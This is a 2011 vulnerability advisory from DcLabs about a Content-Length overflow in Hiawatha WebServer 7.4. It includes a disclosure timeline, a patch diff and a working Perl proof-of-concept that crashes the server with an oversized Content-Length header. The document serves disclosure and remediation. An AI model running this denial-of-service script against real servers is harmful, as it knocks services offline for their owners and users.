@@ -1,0 +1,99 @@
+Source: http://packetstormsecurity.org/files/view/99021/DCA-2011-0006.txt
+
+[Discussion]
+- DcLabs Security Research Group advises about the following vulnerability(ies):
+
+[Software]
+- Hiawatha WebServer 7.4
+
+[Vendor Product Description]
+- Hiawatha is an open source webserver with a focus on security. I
+started Hiawatha in January 2002. Before that time, I had used several
+webservers, but I didn't like them. They had unlogical, almost cryptic
+configuration syntax and none of them gave me a good feeling about
+their security and robustness. So, I decided it was time to write my
+own webserver. I never thought that my webserver would become what it
+is today, but I enjoyed working on it and liked to have my own open
+source project. In the years that followed, Hiawatha became a fully
+functional webserver.
+
+- Source: http://www.hiawatha-webserver.org/files/hiawatha-7.4.tar.gz
+
+[Advisory Timeline]
+
+- 02/24/2011 -> Advisory sent to vendor.
+- 02/24/2011 -> Vendor response.
+- 02/25/2011 -> Patch suggested by vendor.
+- 03/04/2011 -> Advisory published.
+
+[Bug Summary]
+
+- Content-Length entity-header filed miscalculation.
+
+[Impact]
+
+- Low
+
+[Affected Version]
+
+- 7.4
+- Prior versions can also be affected but weren't tested.
+
+[Bug Description and Proof of Concept]
+
+- The web server crashes while sending specially crafted HTTP requests
+leading to Denial of Service.
+
+[PoC]
+
+# Hiawatha Web Server 7.4
+#!/usr/bin/perl
+use IO::Socket;
+        if (@ARGV < 1) {
+                usage();
+        }
+        $ip     = $ARGV[0];
+        $port   = $ARGV[1];
+        print "[+] Sending request...\n";
+        $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr =>
+"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
+        print $socket "OPTIONS * HTTP/1.1\r\n";
+        print $socket "Host: http://www.dclabs.com.br\r\n";
+        print $socket "Content-Length: 2147483599\r\n\r\n";
+        sleep(3);
+        close($socket);
+        print "[+] Done!\n";
+
+sub usage() {
+        print "[-] Usage: <". $0 ."> <host> <port>\n";
+        print "[-] Example: ". $0 ." 127.0.0.1 80\n";
+        exit;
+}
+
+All flaws described here were discovered and researched by:
+Rodrigo Escobar aka ipax.
+DcLabs Security Research Group
+ipax (at) dclabs <dot> com <dot> br
+
+[Patch(s) / Workaround]
+
+-- hiawatha.c --
+
+-- BEGIN --
+20a21
+> #include <limits.h>
+421c422
+<                                                       if
+(content_length < 0) {
+---
+>                                       if ((content_length < 0) || (INT_MAX - content_length -2 <= header_length)) {
+-- END --
+
+[Greetz]
+
+DcLabs Security Research Group.
+
+--
+Rodrigo Escobar (ipax)
+Pentester/Researcher Security Team @ DcLabs
+http://www.dclabs.com.br
